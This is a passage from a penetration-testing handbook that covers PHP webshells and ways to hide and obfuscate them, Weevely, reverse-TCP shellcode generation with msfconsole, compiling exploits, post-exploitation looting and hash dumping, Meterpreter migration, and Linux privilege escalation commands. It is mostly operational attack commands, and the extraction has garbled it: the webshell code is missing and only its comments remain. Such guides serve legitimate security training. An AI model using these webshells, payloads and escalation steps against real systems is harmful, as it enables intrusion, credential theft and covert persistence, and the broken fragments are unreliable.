PHP
This code can be injected into pages that use php.
# Execute one command
# Take input from the url paramter. shell.php?cmd=whoami
# The same but using passthru
# For shell_exec to output the result you need to echo it
# Exec() does not output the result without echo, and only output the last line. So not very useful!
# Instead to this if you can. It will return the output as an array, and then print it all.
# preg_replace(). This is a cool trick
# Using backticks
$output"; ?>
# Using backticks
You can then call then execute the commands like this:
http://192.168.1.103/index.php?cmd=pwd
Make it stealthy
168
Webshell
We can make the commands from above a bit more stealthy. Instead of passing the cmds through the
url, which will be obvious in logs, we cna pass them through other header-paramters. The use
tampterdata or burpsuite to insert the commands. Or just netcat or curl.
# I have had to use this one
Obfuscation
The following functions can be used to obfuscate the code.
eval()
assert()
base64()
gzdeflate()
str_rot13()
Weevely - Incredible tool!
Using weevely we can create php webshells easily.
weevely generate password /root/webshell.php
Not we execute it and get a shell in return:
weevely "http://192.168.1.101/webshell.php" password
ASP
References
http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-
part-3/ http://www.binarytides.com/web-shells-tutorial/
169
Generate Shellcode
Generate Shellcode
Generate shellcode
An easy way to generate shellcode is by using msfvenom or msconsole. I mostly see people
recommending msfvenom online, but I think msfconsole can be a bit easier to work with. But of
course it is the same thing, just different interfaces.
Msfconsole
In msfconsole you have the keyword generate that help us generate shellcode. So first we have to
select a payload.
use payload/windows/shell_reverse_tcp
Now we set the variables as usual
set LPORT 5555
set LHOST 192.168.0.101
Now we genereate the shellcode using the command generate.
To see the options use generate -h
Single commands in windows
If you don't have space and only want to execute a single command you can use
use payload/windows/exec
use payload/cmd/windows/generic
170
Editing Exploits
Editing Exploits
Editing exploits
We often find exploits that do not work out of the box. Typical problems we encounter are:
Payload needs to be changed
Return-address is incorrect
171
Compiling windows exploits
Compiling windows exploits
Compiling exploits for windows on Linux can be a bit of a hassle.
i686-w64-mingw32-gcc exploit.c -o exploit
For 32bit
i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32
172
Post Exploitation
Post Exploitation
Post Exploitation
In order to move horizontally on the network we need to know as much about the machine as
possible. We need to loot it. These are some things that must be done on every compromised machine.
Tcp dump
Who else is connected to the machine?
Dump the hashes
It is always good to have a list of all the hashes and crack them. Maybe someone is reusing the
password.
To what is the machine connected?
netstat
ipconfig
Email and personal files
Logs
173
Spawning Shells
Spawning Shells
Spawning shells
Non-interactive tty-shell
If you have a non-tty-shell there are certain commands and stuff you can't do. This can happen if you
upload reverse shells on a webserver, so that the shell you get is by the user www-data, or similar.
These users are not meant to have shells as they don't interact with the system has humans do.
So if you don't have a tty-shell you can't run su, sudo for example. This can be annoying if you
manage to get a root password but you can't use it.
Anyways, if you get one of these shells you can upgrade it to a tty-shell using the following methods:
Using python
python -c 'import pty; pty.spawn("/bin/sh")'
Echo
echo 'os.system('/bin/bash')'
sh
/bin/sh -i
bash
/bin/bash -i
Perl
perl -e 'exec "/bin/sh";'
From within VI
:!bash
Interactive tty-shell
So if you manage to upgrade to a non-interactive tty-shell you will still have a limited shell. You
won't be able to use the up and down arrows, you won't have tab-completion. This might be really
frustrating if you stay in that shell for long. It can also be more risky, if a execution gets stuck you
cant use Ctr-C or Ctr-Z without killing your session. However that can be fixed using socat. Follow
these instructions.
https://github.com/cornerpirate/socat-shell
References:
174
Spawning Shells
http://unix.stackexchange.com/questions/122616/why-do-i-need-a-tty-to-run-sudo-if-i-can-sudo-
without-a-password http://netsec.ws/?p=337 http://pentestmonkey.net/blog/post-exploitation-without-
a-tty
175
Meterpreter for Post-Exploitation
Meterpreter for Post-Exploitation
Meterpreter shell for post-exploitation
By now you probably has some kind of shell to the target. If it is not a meterpreter shell you should
probably try to turn the current shell into a meterpreter shell, since it gives you a lot of tools available
really easy.
So just create a meterpreter-shell from msfvenom or something like that. Maybe a php-shell. Or
whatever you have access to. Then you just fire that script and get your meterpreter shell. Check out
the chapter Exploiting/Msfvenom for more about creating payloads.
Basics
List all commands
help
Get help about a specific command
help upload
Sessions
So first some basics. You can put the shell into a background job with the command background.
This might be useful if you have several shells going at the same time. Or if you want to move to a
specific directory to upload or download some files.
List background sessions
background -l
Connect back to a background session
background -i 1
Upload and download files.
upload
download
Scripts
Migrate
A really common and useful script that is build into metasploit is the migrate script. If you get the
shell through some kind of exploits that crashes a program the user might shut down that program and
it will close your session. So you need to migrate your session to another process. You can do that
with the migrate script.
176
Meterpreter for Post-Exploitation
First run this command to output all processes
ps
Now you choose one and run
run migrate -p 1327
Where the -p is the PID of the process.
Post modules
There are tons of modules specifically created for post-exploitation. They can be found with
use post/
Upgrade a normal shell to metepreter
There is a point in doing stuff through metasploit. For example, if you find a exploit that does not
have meterpreter available as a payload you can just start a normal shell and then upgrade it. To do
that you do the following:
First you generate a shell through metasploit, either through a specici exploit or through a msfvenom-
shell that you upload. Now that you have a normal shell it is time to upgrade it to a meterpreter shell.
First we have to leave the shell but without killing it. So we do
Ctr-z
Background session 2? [y/N] y
Now we have that shell running in the background, and you can see it with
show sessions
#or
sessions -l
And you can connect to it again with
sessions -i 1
Or whatever the number of the session is.
So now we have the shell running in the background. It is time to upgrade
use post/multi/manage/shell_to_meterpreter
set LHOST 192.168.1.102
set session 1
exploit
Now metasploit will create a new session with meterpeter that will be available to you.
177
Privilege Escalation - Linux
Privilege Escalation - Linux
Privilege Escalation
Once we have a limited shell it is useful to escalate that shells privileges. This way it will be easier to
hide, read and write any files, and persist between reboots.
In this chapter I am going to go over these common Linux privilege escalation techniques:
Kernel exploits
Programs running as root
Installed software
Weak/reused/plaintext passwords
Inside service
Suid misconfiguration
Abusing sudo-rights
World writable scripts invoked by root
Bad path configuration
Cronjobs
Unmounted filesystems
Enumeration scripts
I have used principally three scripts that are used to enumerate a machine. They are some difference
between the scripts, but they output a lot of the same. So test them all out and see which one you like
best.
LinEnum
https://github.com/rebootuser/LinEnum
Here are the options:
-k Enter keyword
-e Enter export location
-t Include thorough (lengthy) tests
-r Enter report name
-h Displays this help text
Unix privesc
http://pentestmonkey.net/tools/audit/unix-privesc-check
Run the script and save the output in a file, and then grep for warning in it.
Linprivchecker.py
https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py
Privilege Escalation Techniques
178
Privilege Escalation - Linux
Kernel Exploits
By exploiting vulnerabilities in the Linux Kernel we can sometimes escalate our privileges. What we
usually need to know to test if a kernel exploit works is the OS, architecture and kernel version.
Check the following:
OS:
Architecture:
Kernel version:
uname -a
cat /proc/version
cat /etc/issue
Search for exploits
site:exploit-db.com kernel version
python linprivchecker.py extended
Don't use kernel exploits if you can avoid it. If you use it it might crash the machine or put it in an
unstable state. So kernel exploits should be the last resort. Always use a simpler priv-esc if you can.
They can also produce a lot of stuff in the sys.log. So if you find anything good, put it up on your
list and keep searching for other ways before exploiting it.
Programs running as root
The idea here is that if specific service is running as root and you can make that service execute
commands you can execute commands as root. Look for webserver, database or anything else like
that. A typical example of this is mysql, example is below.
Check which processes are running
# Metasploit
ps
# Linux
ps aux
Mysql
If you find that mysql is running as root and you username and password to log in to the database you
can issue the following commands:
select sys_exec('whoami');
select sys_eval('whoami');
If neither of those work you can use a User Defined Function/
User Installed Software
Has the user installed some third party software that might be vulnerable? Check it out. If you find
179
Privilege Escalation - Linux
anything google it for exploits.
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/
# Debian
dpkg -l
# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )
# OpenBSD, FreeBSD
pkg_info
Weak/reused/plaintext passwords
Check file where webserver connect to database (config.php or similar)
Check databases for admin passwords that might be reused
Check weak passwords
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
Check plaintext password
# Anything interesting the the mail?
/var/spool/mail
./LinEnum.sh -t -k password
Service only available from inside
It might be that case that the user is running some service that is only available from that host. You
can't connect to the service from the outside. It might be a development server, a database, or anything
else. These services might be running as root, or they might have vulnerabilities in them. They might
be even more vulnerable since the developer or user might be thinking "since it is only accessible for
the specific user we don't need to spend that much of security".
Check the netstat and compare it with the nmap-scan you did from the outside. Do you find more
services available from the inside?
# Linux
netstat -anlp
netstat -ano
180
Privilege Escalation - Linux
Suid and Guid Misconfiguration
When a binary with suid permission is run it is run as another user, and therefore with the other users
privileges. It could be root, or just another user. If the suid-bit is set on a program that can spawn a
shell or in another way be abuse we could use that to escalate our privileges.
For example, these are some programs that can be used to spawn a shell:
nmap
vim
less
more
If these programs have suid-bit set we can use them to escalate privileges too. For more of these and
how to use the see the next section about abusing sudo-rights:
nano
cp
mv
find
Find suid and guid files
#Find SUID
find / -perm -u=s -type f 2>/dev/null
#Find GUID
find / -perm -g=s -type f 2>/dev/null